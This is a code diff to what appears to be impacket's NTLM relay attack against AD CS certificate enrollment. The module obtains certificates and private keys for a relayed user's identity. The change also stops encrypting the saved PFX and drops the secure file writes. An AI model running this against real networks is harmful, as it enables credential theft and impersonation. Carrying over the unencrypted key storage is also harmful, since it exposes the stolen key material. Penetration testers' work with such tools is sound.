@@ -10,18 +10,22 @@
 #
 # Microsoft Certificate Enrollment Services (CES/WSTEP) relay attack.
 
+import base64
+import os
+
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.serialization import Encoding
+
 from impacket import LOG
+from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack
 from impacket.examples.ntlmrelayx.utils.ces import (
     CES_MAX_RESPONSE,
     CES_TEMPLATE_DEFAULT,
-    allocate_artifact_paths,
     build_ces_soap,
-    create_encrypted_pfx,
     decode_certificate,
     decode_pkcs7,
+    derive_subject_cn,
     extract_response_tokens,
-    generate_csr,
-    secure_write,
     soap_http_headers,
     target_url,
 )
@@ -42,7 +46,9 @@ class CESAttack:
         identity = "%s\\%s" % (self.domain, self.username) if self.domain else self.username
         template = self.config.template or CES_TEMPLATE_DEFAULT
         try:
-            csr_b64, key = generate_csr(identity)
+            key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+            csr = ADCSAttack.generate_csr(key, derive_subject_cn(identity), None, csr_type=Encoding.DER)
+            csr_b64 = base64.b64encode(csr).decode("ascii")
             url = target_url(self.target, self.relay_client)
             soap = build_ces_soap(url, csr_b64, template)
             body = soap.encode("utf-8")
@@ -67,23 +73,29 @@ class CESAttack:
             if p7b_tokens:
                 p7b_der = decode_pkcs7(p7b_tokens[0])
 
-            paths = allocate_artifact_paths(self.config.cesOutputDir, identity)
+            if not os.path.isdir(self.config.lootdir):
+                os.makedirs(self.config.lootdir, exist_ok=True)
+            output_name = ADCSAttack._sanitize_filename(identity)
             if cert_der is not None:
-                secure_write(paths["cer"], cert_der)
-                LOG.info("Saved issued CES certificate: %s", paths["cer"])
+                cert_path = os.path.join(self.config.lootdir, output_name + ".cer")
+                with open(cert_path, "wb") as output:
+                    output.write(cert_der)
+                LOG.info("Saved issued CES certificate: %s", cert_path)
             else:
                 LOG.warning("CES response did not contain an X509v3 certificate; PFX was not created")
 
             if p7b_der is not None:
-                secure_write(paths["p7b"], p7b_der)
-                LOG.info("Saved CES PKCS#7 response: %s", paths["p7b"])
+                p7b_path = os.path.join(self.config.lootdir, output_name + ".p7b")
+                with open(p7b_path, "wb") as output:
+                    output.write(p7b_der)
+                LOG.info("Saved CES PKCS#7 response: %s", p7b_path)
             else:
                 LOG.warning("CES response did not contain a PKCS#7 token")
 
             if certificate is not None:
-                pfx, password = create_encrypted_pfx(certificate, key)
-                secure_write(paths["pfx"], pfx)
-                LOG.info("Saved password-encrypted CES PFX: %s", paths["pfx"])
-                LOG.info("CES PFX password (sensitive): %s", password)
+                pfx_path = os.path.join(self.config.lootdir, output_name + ".pfx")
+                with open(pfx_path, "wb") as output:
+                    output.write(ADCSAttack.generate_pfx(key, certificate))
+                LOG.info("Saved CES PFX: %s", pfx_path)
         except Exception as exc:
             LOG.error("CES SOAP enrollment failed: %s", exc)
